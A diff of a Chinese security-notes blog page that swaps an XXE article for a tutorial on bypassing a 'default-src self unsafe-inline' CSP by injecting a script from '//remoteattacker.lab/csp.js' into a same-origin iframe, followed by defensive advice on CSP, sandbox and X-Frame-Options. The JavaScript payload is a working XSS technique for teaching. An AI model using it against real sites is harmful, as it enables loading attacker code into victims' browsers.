@@ -17,22 +17,20 @@
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
   <meta name="theme-color" media="(prefers-color-scheme: dark)" content="#000">
   <meta name="theme-color" content="#f9fafb">
-  <title>Web知识点：xxe漏洞 - Myblog</title>
+  <title>Web知识点：绕过 CSP 默认源 - Myblog</title>
 
   
-    <meta name="description" content="xxe漏洞">
+    <meta name="description" content="🔍 攻击原理详解✅ CSP 设置分析&lt;font style&#x3D;&quot;color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);&quot;&gt;default-src &#39;self&#39; &#39;unsafe-inline&#39;;&lt;&#x2F;font&gt;  &lt;font style&#x3D;&quot;c">
 <meta property="og:type" content="website">
-<meta property="og:title" content="xxe漏洞">
-<meta property="og:url" content="https://cbbzx12.github.io/wiki/Web%E7%9F%A5%E8%AF%86%E7%82%B9/xxe%E6%BC%8F%E6%B4%9E/xxe%E6%BC%8F%E6%B4%9E/">
+<meta property="og:title" content="绕过 CSP 默认源">
+<meta property="og:url" content="https://cbbzx12.github.io/wiki/Web%E7%9F%A5%E8%AF%86%E7%82%B9/xss/%E7%BB%95%E8%BF%87%20CSP%20%E9%BB%98%E8%AE%A4%E6%BA%90/">
 <meta property="og:site_name" content="Myblog">
-<meta property="og:description" content="xxe漏洞">
+<meta property="og:description" content="🔍 攻击原理详解✅ CSP 设置分析&lt;font style&#x3D;&quot;color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);&quot;&gt;default-src &#39;self&#39; &#39;unsafe-inline&#39;;&lt;&#x2F;font&gt;  &lt;font style&#x3D;&quot;c">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2021/png/2476579/1629946396091-c96807bc-763f-4bd0-995f-107756606642.png">
-<meta property="article:published_time" content="2025-12-23T07:42:12.789Z">
-<meta property="article:modified_time" content="2025-12-23T07:42:12.789Z">
+<meta property="article:published_time" content="2025-12-23T07:42:12.787Z">
+<meta property="article:modified_time" content="2025-12-23T07:42:12.787Z">
 <meta property="article:author" content="bug_001">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://cdn.nlark.com/yuque/0/2021/png/2476579/1629946396091-c96807bc-763f-4bd0-995f-107756606642.png">
   
   
   
@@ -48,7 +46,7 @@
 
   
 
-  <script type="application/ld+json">{"@context":"https://schema.org","@type":"Website","@id":"https://cbbzx12.github.io/wiki/Web%E7%9F%A5%E8%AF%86%E7%82%B9/xxe%E6%BC%8F%E6%B4%9E/xxe%E6%BC%8F%E6%B4%9E/","author":{"@type":"Person","name":"bug_001","sameAs":[]},"name":"xxe漏洞","description":"xxe漏洞\n","url":"https://cbbzx12.github.io/wiki/Web%E7%9F%A5%E8%AF%86%E7%82%B9/xxe%E6%BC%8F%E6%B4%9E/xxe%E6%BC%8F%E6%B4%9E/"}</script>
+  <script type="application/ld+json">{"@context":"https://schema.org","@type":"Website","@id":"https://cbbzx12.github.io/wiki/Web%E7%9F%A5%E8%AF%86%E7%82%B9/xss/%E7%BB%95%E8%BF%87%20CSP%20%E9%BB%98%E8%AE%A4%E6%BA%90/","author":{"@type":"Person","name":"bug_001","sameAs":[]},"name":"绕过 CSP 默认源","description":"🔍 攻击原理详解✅ CSP 设置分析&lt;font style=&quot;color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);&quot;&gt;default-src &#39;self&#39; &#39;unsafe-inline&#39;;&lt;/font&gt;\n\n&lt;font style=&quo...","url":"https://cbbzx12.github.io/wiki/Web%E7%9F%A5%E8%AF%86%E7%82%B9/xss/%E7%BB%95%E8%BF%87%20CSP%20%E9%BB%98%E8%AE%A4%E6%BA%90/"}</script>
   
 </head>
 <body><div class="sitebg"><div class="siteblur"></div></div>
@@ -86,20 +84,92 @@
     <div class="top bread-nav footnote"><div class="left"><div class="flex-row" id="breadcrumb"><a class="cap breadcrumb" href="/">主页</a>
 
   <span class="sep"></span>
-  <a class="cap breadcrumb" href="/wiki/Web%E7%9F%A5%E8%AF%86%E7%82%B9/xxe%E6%BC%8F%E6%B4%9E/xxe%E6%BC%8F%E6%B4%9E/">xxe漏洞</a>
+  <a class="cap breadcrumb" href="/wiki/Web%E7%9F%A5%E8%AF%86%E7%82%B9/xss/%E7%BB%95%E8%BF%87%20CSP%20%E9%BB%98%E8%AE%A4%E6%BA%90/">绕过 CSP 默认源</a>
   </div>
-<div class="flex-row" id="post-meta"><span class="text created">更新于：<time datetime="2025-12-23T07:42:12.789Z">2025-12-23</time></span></div></div></div>
+<div class="flex-row" id="post-meta"><span class="text created">更新于：<time datetime="2025-12-23T07:42:12.787Z">2025-12-23</time></span></div></div></div>
     
     <div class="bottom only-title">
       
       <div class="text-area">
-        <h1 class="text title"><span>xxe漏洞</span></h1>
+        <h1 class="text title"><span>绕过 CSP 默认源</span></h1>
         
       </div>
     </div>
     
   </div>
-  </div><article class="md-text content"><h1 id="xxe漏洞"><a href="#xxe漏洞" class="headerlink" title="xxe漏洞"></a>xxe漏洞</h1><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2476579/1629946396091-c96807bc-763f-4bd0-995f-107756606642.png"></p>
+  </div><article class="md-text content"><h3 id="🔍-攻击原理详解"><a href="#🔍-攻击原理详解" class="headerlink" title="🔍 攻击原理详解"></a><font style="color:rgba(0, 0, 0, 0.9);">🔍</font><font style="color:rgba(0, 0, 0, 0.9);"> 攻击原理详解</font></h3><h4 id="✅-CSP-设置分析"><a href="#✅-CSP-设置分析" class="headerlink" title="✅ CSP 设置分析"></a><font style="color:rgba(0, 0, 0, 0.9);">✅</font><font style="color:rgba(0, 0, 0, 0.9);"> CSP 设置分析</font></h4><p><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);&quot;&gt;default-src &#39;self&#39; &#39;unsafe-inline&#39;;&lt;/font&gt;</code></p>
+<ul>
+<li><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);&quot;&gt;&#39;self&#39;&lt;/font&gt;</code><font style="color:rgba(0, 0, 0, 0.9);">：只允许加载同源资源。</font></li>
+<li><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);&quot;&gt;&#39;unsafe-inline&#39;&lt;/font&gt;</code><font style="color:rgba(0, 0, 0, 0.9);">：允许内联脚本（如 </font><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;/font&gt;</code><font style="color:rgba(0, 0, 0, 0.9);">）。</font></li>
+<li><font style="color:rgba(0, 0, 0, 0.9);">❌</font><font style="color:rgba(0, 0, 0, 0.9);"> </font><strong><font style="color:rgba(0, 0, 0, 0.9);">不允许从外部域名加载脚本</font></strong><font style="color:rgba(0, 0, 0, 0.9);">（如 </font><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);&quot;&gt;//remoteattacker.lab/csp.js&lt;/font&gt;</code><font style="color:rgba(0, 0, 0, 0.9);">）。</font></li>
+</ul>
+<hr>
+<h3 id="✅-攻击思路：利用-iframe-的“同源”特性"><a href="#✅-攻击思路：利用-iframe-的“同源”特性" class="headerlink" title="✅ 攻击思路：利用 iframe 的“同源”特性"></a><font style="color:rgba(0, 0, 0, 0.9);">✅</font><font style="color:rgba(0, 0, 0, 0.9);"> 攻击思路：利用 iframe 的“同源”特性</font></h3><p><font style="color:rgba(0, 0, 0, 0.9);">虽然主页面不能加载外部脚本，但：</font></p>
+<ol>
+<li><strong><font style="color:rgba(0, 0, 0, 0.9);">iframe 加载的是同源页面</font></strong><font style="color:rgba(0, 0, 0, 0.9);">（如 </font><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);&quot;&gt;/robots.txt&lt;/font&gt;</code><font style="color:rgba(0, 0, 0, 0.9);">，只要是同源的就行）。</font></li>
+<li><strong><font style="color:rgba(0, 0, 0, 0.9);">iframe 的内容属于同源，因此可以操作其 DOM</font></strong><font style="color:rgba(0, 0, 0, 0.9);">。</font></li>
+<li><strong><font style="color:rgba(0, 0, 0, 0.9);">向 iframe 中注入 </font></strong><code>**&lt;font style=&quot;color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);&quot;&gt;&lt;script&gt;&lt;/font&gt;**</code><strong><font style="color:rgba(0, 0, 0, 0.9);">，相当于在同源环境中加载外部脚本</font></strong><font style="color:rgba(0, 0, 0, 0.9);">，从而绕过 CSP 限制。</font></li>
+</ol>
+<hr>
+<h3 id="✅-攻击代码逐步解释"><a href="#✅-攻击代码逐步解释" class="headerlink" title="✅ 攻击代码逐步解释"></a><font style="color:rgba(0, 0, 0, 0.9);">✅</font><font style="color:rgba(0, 0, 0, 0.9);"> 攻击代码逐步解释</font></h3><h4 id="第一步：创建-iframe-并加载同源页面"><a href="#第一步：创建-iframe-并加载同源页面" class="headerlink" title="第一步：创建 iframe 并加载同源页面"></a><font style="color:rgba(0, 0, 0, 0.9);">第一步：创建 iframe 并加载同源页面</font></h4><p><strong><font style="color:rgba(0, 0, 0, 0.9);">JavaScript</font></strong></p>
+<p><font style="color:rgba(0, 0, 0, 0.6);">复制</font></p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">f = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&quot;iframe&quot;</span>);</span><br><span class="line">f.<span class="property">id</span> = <span class="string">&quot;pwn&quot;</span>;</span><br><span class="line">f.<span class="property">src</span> = <span class="string">&quot;/robots.txt&quot;</span>;  <span class="comment">// 只要是同源的就行</span></span><br><span class="line"><span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">appendChild</span>(f);</span><br></pre></td></tr></table></figure>
+
+<h4 id="第二步：iframe-加载完成后，向其中注入外部脚本"><a href="#第二步：iframe-加载完成后，向其中注入外部脚本" class="headerlink" title="第二步：iframe 加载完成后，向其中注入外部脚本"></a><font style="color:rgba(0, 0, 0, 0.9);">第二步：iframe 加载完成后，向其中注入外部脚本</font></h4><p><strong><font style="color:rgba(0, 0, 0, 0.9);">JavaScript</font></strong></p>
+<p><font style="color:rgba(0, 0, 0, 0.6);">复制</font></p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">f.<span class="property">onload</span> = <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    x = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;script&#x27;</span>);</span><br><span class="line">    x.<span class="property">src</span> = <span class="string">&#x27;//remoteattacker.lab/csp.js&#x27;</span>;  <span class="comment">// 外部恶意脚本</span></span><br><span class="line">    pwn.<span class="property">contentWindow</span>.<span class="property">document</span>.<span class="property">body</span>.<span class="title function_">appendChild</span>(x);  <span class="comment">// 注入到 iframe 中</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h3 id="✅-简化版代码（你提供的第二段）"><a href="#✅-简化版代码（你提供的第二段）" class="headerlink" title="✅ 简化版代码（你提供的第二段）"></a><font style="color:rgba(0, 0, 0, 0.9);">✅</font><font style="color:rgba(0, 0, 0, 0.9);"> 简化版代码（你提供的第二段）</font></h3><p><strong><font style="color:rgba(0, 0, 0, 0.9);">JavaScript</font></strong></p>
+<p><font style="color:rgba(0, 0, 0, 0.6);">复制</font></p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">script = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;script&#x27;</span>);</span><br><span class="line">script.<span class="property">src</span> = <span class="string">&#x27;//remoteattacker.lab/csp.js&#x27;</span>;</span><br><span class="line"><span class="variable language_">window</span>.<span class="property">frames</span>[<span class="number">0</span>].<span class="property">document</span>.<span class="property">head</span>.<span class="title function_">appendChild</span>(script);</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><font style="color:rgba(0, 0, 0, 0.9);">这段代码假设页面上已经有一个 iframe（比如前面注入的）。</font></li>
+<li><font style="color:rgba(0, 0, 0, 0.9);">它直接向 iframe 的 DOM 中插入外部脚本，</font><strong><font style="color:rgba(0, 0, 0, 0.9);">绕过主页面 CSP</font></strong><font style="color:rgba(0, 0, 0, 0.9);">。</font></li>
+</ul>
+<hr>
+<h3 id="⚠️-关键点总结"><a href="#⚠️-关键点总结" class="headerlink" title="⚠️ 关键点总结"></a><font style="color:rgba(0, 0, 0, 0.9);">⚠️</font><font style="color:rgba(0, 0, 0, 0.9);"> 关键点总结</font></h3><p><strong><font style="color:rgba(0, 0, 0, 0.9);background-color:rgb(245, 245, 245);">表格</font></strong></p>
+<p><font style="color:rgba(0, 0, 0, 0.6);background-color:rgb(245, 245, 245);">复制</font></p>
+<table>
+<thead>
+<tr>
+<th align="left"><strong><font style="color:rgba(0, 0, 0, 0.9);">限制</font></strong></th>
+<th align="left"><strong><font style="color:rgba(0, 0, 0, 0.9);">绕过方式</font></strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left"><font style="color:rgba(0, 0, 0, 0.9);">主页面不能加载外部脚本</font></td>
+<td align="left"><font style="color:rgba(0, 0, 0, 0.9);">不直接加载，而是注入到</font><font style="color:rgba(0, 0, 0, 0.9);"> </font><strong><font style="color:rgba(0, 0, 0, 0.9);">同源的 iframe</font></strong><font style="color:rgba(0, 0, 0, 0.9);"> </font><font style="color:rgba(0, 0, 0, 0.9);">中</font></td>
+</tr>
+<tr>
+<td align="left"><font style="color:rgba(0, 0, 0, 0.9);">iframe 也受 CSP 限制？</font></td>
+<td align="left"><font style="color:rgba(0, 0, 0, 0.9);">✅</font><font style="color:rgba(0, 0, 0, 0.9);"> 但</font><font style="color:rgba(0, 0, 0, 0.9);"> </font><strong><font style="color:rgba(0, 0, 0, 0.9);">iframe 的 DOM 可以被主页面操作</font></strong><font style="color:rgba(0, 0, 0, 0.9);">，只要同源</font></td>
+</tr>
+<tr>
+<td align="left"><font style="color:rgba(0, 0, 0, 0.9);">外部脚本加载成功？</font></td>
+<td align="left"><font style="color:rgba(0, 0, 0, 0.9);">✅</font><font style="color:rgba(0, 0, 0, 0.9);"> 因为</font><font style="color:rgba(0, 0, 0, 0.9);"> </font><strong><font style="color:rgba(0, 0, 0, 0.9);">iframe 中插入的脚本不受主页面 CSP 限制</font></strong><font style="color:rgba(0, 0, 0, 0.9);">（它是独立文档）</font></td>
+</tr>
+</tbody></table>
+<hr>
+<h3 id="✅-防御建议"><a href="#✅-防御建议" class="headerlink" title="✅ 防御建议"></a><font style="color:rgba(0, 0, 0, 0.9);">✅</font><font style="color:rgba(0, 0, 0, 0.9);"> 防御建议</font></h3><ol>
+<li><strong><font style="color:rgba(0, 0, 0, 0.9);">限制 iframe 使用</font></strong><font style="color:rgba(0, 0, 0, 0.9);">：</font><ul>
+<li><font style="color:rgba(0, 0, 0, 0.9);">使用 </font><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);&quot;&gt;frame-ancestors &#39;none&#39;&lt;/font&gt;</code><font style="color:rgba(0, 0, 0, 0.9);"> 防止被嵌套。</font></li>
+<li><font style="color:rgba(0, 0, 0, 0.9);">或使用 </font><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);&quot;&gt;sandbox&lt;/font&gt;</code><font style="color:rgba(0, 0, 0, 0.9);"> 属性限制 iframe 权限。</font></li>
+</ul>
+</li>
+<li><strong><font style="color:rgba(0, 0, 0, 0.9);">细化 CSP</font></strong><font style="color:rgba(0, 0, 0, 0.9);">：</font><ul>
+<li><font style="color:rgba(0, 0, 0, 0.9);">不要使用 </font><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);&quot;&gt;default-src &#39;self&#39;&lt;/font&gt;</code><font style="color:rgba(0, 0, 0, 0.9);"> 这么宽松。</font></li>
+<li><font style="color:rgba(0, 0, 0, 0.9);">明确指定 </font><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);&quot;&gt;script-src &#39;self&#39;&lt;/font&gt;</code><font style="color:rgba(0, 0, 0, 0.9);"> 禁止外部脚本。</font></li>
+<li><font style="color:rgba(0, 0, 0, 0.9);">禁止 </font><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);&quot;&gt;&#39;unsafe-inline&#39;&lt;/font&gt;</code><font style="color:rgba(0, 0, 0, 0.9);"> 或使用 </font><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);&quot;&gt;nonce/hash&lt;/font&gt;</code><font style="color:rgba(0, 0, 0, 0.9);"> 机制。</font></li>
+</ul>
+</li>
+<li><strong><font style="color:rgba(0, 0, 0, 0.9);">防止 iframe 被滥用</font></strong><font style="color:rgba(0, 0, 0, 0.9);">：</font><ul>
+<li><font style="color:rgba(0, 0, 0, 0.9);">对页面中动态创建的 iframe 进行监控或限制。</font></li>
+<li><font style="color:rgba(0, 0, 0, 0.9);">设置 </font><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);&quot;&gt;X-Frame-Options: DENY&lt;/font&gt;</code><font style="color:rgba(0, 0, 0, 0.9);"> 或 </font><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);&quot;&gt;SAMEORIGIN&lt;/font&gt;</code><font style="color:rgba(0, 0, 0, 0.9);">。</font></li>
+</ul>
+</li>
+</ol>
 </article>
 <div class="article-footer">
 
@@ -117,7 +187,7 @@
 
 
 
-<widget class="widget-wrapper toc" id="data-toc" collapse="false"><div class="widget-header dis-select"><span class="name">本文目录</span><a class="cap-action" onclick="sidebar.toggleTOC()" ><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6h11m-11 6h11m-11 6h11M4 6h1v4m-1 0h2m0 8H4c0-1 2-2 2-3s-1-1.5-2-1"/></svg></a></div><div class="widget-body"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#xxe%E6%BC%8F%E6%B4%9E"><span class="toc-text">xxe漏洞</span></a></li></ol></div><div class="widget-footer"><a class="top" onclick="util.scrollTop()"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><!-- Icon from Solar by 480 Design - https://creativecommons.org/licenses/by/4.0/ --><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-width="1.5"><path stroke-linejoin="round" d="m9 15.5l3-3l3 3m-6-4l3-3l3 3"/><path d="M7 3.338A9.95 9.95 0 0 1 12 2c5.523 0 10 4.477 10 10s-4.477 10-10 10S2 17.523 2 12c0-1.821.487-3.53 1.338-5"/></g></svg><span>回到顶部</span></a></div></widget>
+<widget class="widget-wrapper toc" id="data-toc" collapse="false"><div class="widget-header dis-select"><span class="name">本文目录</span><a class="cap-action" onclick="sidebar.toggleTOC()" ><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6h11m-11 6h11m-11 6h11M4 6h1v4m-1 0h2m0 8H4c0-1 2-2 2-3s-1-1.5-2-1"/></svg></a></div><div class="widget-body"><ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%94%8D-%E6%94%BB%E5%87%BB%E5%8E%9F%E7%90%86%E8%AF%A6%E8%A7%A3"><span class="toc-text">🔍 攻击原理详解</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%9C%85-CSP-%E8%AE%BE%E7%BD%AE%E5%88%86%E6%9E%90"><span class="toc-text">✅ CSP 设置分析</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%9C%85-%E6%94%BB%E5%87%BB%E6%80%9D%E8%B7%AF%EF%BC%9A%E5%88%A9%E7%94%A8-iframe-%E7%9A%84%E2%80%9C%E5%90%8C%E6%BA%90%E2%80%9D%E7%89%B9%E6%80%A7"><span class="toc-text">✅ 攻击思路：利用 iframe 的“同源”特性</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%9C%85-%E6%94%BB%E5%87%BB%E4%BB%A3%E7%A0%81%E9%80%90%E6%AD%A5%E8%A7%A3%E9%87%8A"><span class="toc-text">✅ 攻击代码逐步解释</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E6%AD%A5%EF%BC%9A%E5%88%9B%E5%BB%BA-iframe-%E5%B9%B6%E5%8A%A0%E8%BD%BD%E5%90%8C%E6%BA%90%E9%A1%B5%E9%9D%A2"><span class="toc-text">第一步：创建 iframe 并加载同源页面</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AC%AC%E4%BA%8C%E6%AD%A5%EF%BC%9Aiframe-%E5%8A%A0%E8%BD%BD%E5%AE%8C%E6%88%90%E5%90%8E%EF%BC%8C%E5%90%91%E5%85%B6%E4%B8%AD%E6%B3%A8%E5%85%A5%E5%A4%96%E9%83%A8%E8%84%9A%E6%9C%AC"><span class="toc-text">第二步：iframe 加载完成后，向其中注入外部脚本</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%9C%85-%E7%AE%80%E5%8C%96%E7%89%88%E4%BB%A3%E7%A0%81%EF%BC%88%E4%BD%A0%E6%8F%90%E4%BE%9B%E7%9A%84%E7%AC%AC%E4%BA%8C%E6%AE%B5%EF%BC%89"><span class="toc-text">✅ 简化版代码（你提供的第二段）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%9A%A0%EF%B8%8F-%E5%85%B3%E9%94%AE%E7%82%B9%E6%80%BB%E7%BB%93"><span class="toc-text">⚠️ 关键点总结</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%9C%85-%E9%98%B2%E5%BE%A1%E5%BB%BA%E8%AE%AE"><span class="toc-text">✅ 防御建议</span></a></li></ol></div><div class="widget-footer"><a class="top" onclick="util.scrollTop()"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><!-- Icon from Solar by 480 Design - https://creativecommons.org/licenses/by/4.0/ --><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-width="1.5"><path stroke-linejoin="round" d="m9 15.5l3-3l3 3m-6-4l3-3l3 3"/><path d="M7 3.338A9.95 9.95 0 0 1 12 2c5.523 0 10 4.477 10 10s-4.477 10-10 10S2 17.523 2 12c0-1.821.487-3.53 1.338-5"/></g></svg><span>回到顶部</span></a></div></widget>
 </div></aside><div class='float-panel'>
   <button type='button' style='display:none' class='laptop-only rightbar-toggle mobile' onclick='sidebar.rightbar()'>
     <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6h11m-11 6h11m-11 6h11M4 6h1v4m-1 0h2m0 8H4c0-1 2-2 2-3s-1-1.5-2-1"/></svg>
